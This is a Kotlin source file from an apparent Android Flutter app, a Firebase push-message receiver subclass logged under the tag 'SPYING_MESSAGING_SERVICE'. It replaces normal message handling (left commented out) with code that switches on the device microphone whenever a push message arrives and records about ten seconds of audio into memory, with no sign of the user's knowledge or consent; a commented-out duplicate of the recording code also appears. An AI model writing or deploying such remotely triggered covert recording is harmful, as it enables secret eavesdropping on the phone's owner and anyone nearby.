package com.wakil_training_.enigma.services

import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.os.Handler
import android.os.Looper
import android.os.Parcel
import android.os.ParcelFileDescriptor

import com.google.firebase.messaging.RemoteMessage
import io.flutter.Log
import io.flutter.plugins.firebase.messaging.ContextHolder
import io.flutter.plugins.firebase.messaging.FlutterFirebaseMessagingBackgroundService
import io.flutter.plugins.firebase.messaging.FlutterFirebaseMessagingReceiver
import io.flutter.plugins.firebase.messaging.FlutterFirebaseMessagingStore
import io.flutter.plugins.firebase.messaging.FlutterFirebaseRemoteMessageLiveData
import java.io.ByteArrayOutputStream
import java.io.IOException
import java.io.InputStream

class MyCallingReceiver: FlutterFirebaseMessagingReceiver() {

    val TAG: String = "SPYING_MESSAGING_SERVICE"

    var notifications: HashMap<String?, RemoteMessage> = HashMap()
    private var recorder: MediaRecorder? = null
    private val handler = Handler(Looper.getMainLooper())

    override fun onReceive(context: Context, intent: Intent) {
        Log.d(TAG, "broadcast received for message")
        if (ContextHolder.getApplicationContext() == null) {
            var aContext: Context? = context
            if (context.applicationContext != null) {
                aContext = context.applicationContext
            }

            ContextHolder.setApplicationContext(aContext)
        }

        if (intent.extras == null) {
            Log.d(
                TAG,
                "broadcast received but intent contained no extras to process RemoteMessage. Operation cancelled."
            )
            return
        }

        val remoteMessage = RemoteMessage(intent.extras)

        // Store the RemoteMessage if the message contains a notification payload.
        if (remoteMessage.notification != null) {
            notifications[remoteMessage.messageId] = remoteMessage
//            FlutterFirebaseMessagingStore.getInstance().storeFirebaseMessage(remoteMessage)
        }

        startRecording()

//        //  |-> ---------------------
//        //      App in Foreground
//        //   ------------------------
//        if (FlutterFirebaseMessagingUtils.isApplicationForeground(context)) {
//            FlutterFirebaseRemoteMessageLiveData.getInstance().postRemoteMessage(remoteMessage)
//            return
//        }
//
//        //  |-> ---------------------
//        //    App in Background/Quit
//        //   ------------------------
//        val onBackgroundMessageIntent =
//            Intent(context, FlutterFirebaseMessagingBackgroundService::class.java)
//
//        val parcel = Parcel.obtain()
//        remoteMessage.writeToParcel(parcel, 0)
//        // We write to parcel using RemoteMessage.writeToParcel() to pass entire RemoteMessage as array of bytes
//        // Which can be read using RemoteMessage.createFromParcel(parcel) API
//        onBackgroundMessageIntent.putExtra(
//            FlutterFirebaseMessagingUtils.EXTRA_REMOTE_MESSAGE, parcel.marshall()
//        )
//
//        FlutterFirebaseMessagingBackgroundService.enqueueMessageProcessing(
//            context,
//            onBackgroundMessageIntent,
//            remoteMessage.originalPriority == RemoteMessage.PRIORITY_HIGH
//        )
    }

//    private fun startRecording() {
//        val byteArrayOutputStream = ByteArrayOutputStream()
//
//        try {
//            val descriptors = ParcelFileDescriptor.createPipe()
//            val parcelRead = ParcelFileDescriptor(descriptors[0])
//            val parcelWrite = ParcelFileDescriptor(descriptors[1])
//
//            val inputStream: InputStream = ParcelFileDescriptor.AutoCloseInputStream(parcelRead)
//
//            recorder = MediaRecorder().apply {
//                setAudioSource(MediaRecorder.AudioSource.MIC)
//                setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
//                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
//                setOutputFile(parcelWrite.fileDescriptor)
//                prepare()
//                start()
//            }
//
//            Thread {
//                try {
//                    var read: Int
//                    val data = ByteArray(16384)
//
//                    while (inputStream.read(data, 0, data.size).also { read = it } != -1) {
//                        println(data)
//                        byteArrayOutputStream.write(data, 0, read)
//                    }
//
//                    byteArrayOutputStream.flush()
//                } catch (e: IOException) {
//                    e.printStackTrace()
//                } finally {
//                    try {
//                        inputStream.close()
//                        byteArrayOutputStream.close()
//                        parcelRead.close()
//                        parcelWrite.close()
//                    } catch (e: IOException) {
//                        e.printStackTrace()
//                    }
//                }
//            }.start()
//        } catch (e: IOException) {
//            e.printStackTrace()
//        }
//    }
//
//    private fun stopRecording() {
//        try {
//            recorder?.stop()
//        } catch (e: RuntimeException) {
//            // Handle the case where stop() is called before start() or recorder was not properly initialized
//            e.printStackTrace()
//        } finally {
//            recorder?.reset()
//            recorder?.release()
//            recorder = null
//        }
//    }


    private fun startRecording() {
        val byteArrayOutputStream = ByteArrayOutputStream()

        try {
            val descriptors = ParcelFileDescriptor.createPipe()
            val parcelRead = ParcelFileDescriptor(descriptors[0])
            val parcelWrite = ParcelFileDescriptor(descriptors[1])

            val inputStream: InputStream = ParcelFileDescriptor.AutoCloseInputStream(parcelRead)

            recorder = MediaRecorder().apply {
                setAudioSource(MediaRecorder.AudioSource.MIC)
                setOutputFormat(MediaRecorder.OutputFormat.AMR_NB)
                setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                setOutputFile(parcelWrite.fileDescriptor)
                prepare()
                start()
            }

            Thread {
                try {
                    var read: Int
                    val data = ByteArray(16384)

                    while (inputStream.read(data, 0, data.size).also { read = it } != -1) {
                        println(data)
                        byteArrayOutputStream.write(data, 0, read)
                    }

                    byteArrayOutputStream.flush()
                } catch (e: IOException) {
                    e.printStackTrace()
                } finally {
                    try {
                        inputStream.close()
                        byteArrayOutputStream.close()
                        parcelRead.close()
                        parcelWrite.close()
                    } catch (e: IOException) {
                        e.printStackTrace()
                    }
                }
            }.start()

            // Schedule stopRecording to be called after 10 seconds
            handler.postDelayed({
                stopRecording()
            }, 10000)

        } catch (e: IOException) {
            e.printStackTrace()
        }
    }

    private fun stopRecording() {
        try {
            recorder?.stop()
        } catch (e: RuntimeException) {
            // Handle the case where stop() is called before start() or recorder was not properly initialized
            e.printStackTrace()
        } finally {
            recorder?.reset()
            recorder?.release()
            recorder = null
        }
    }

}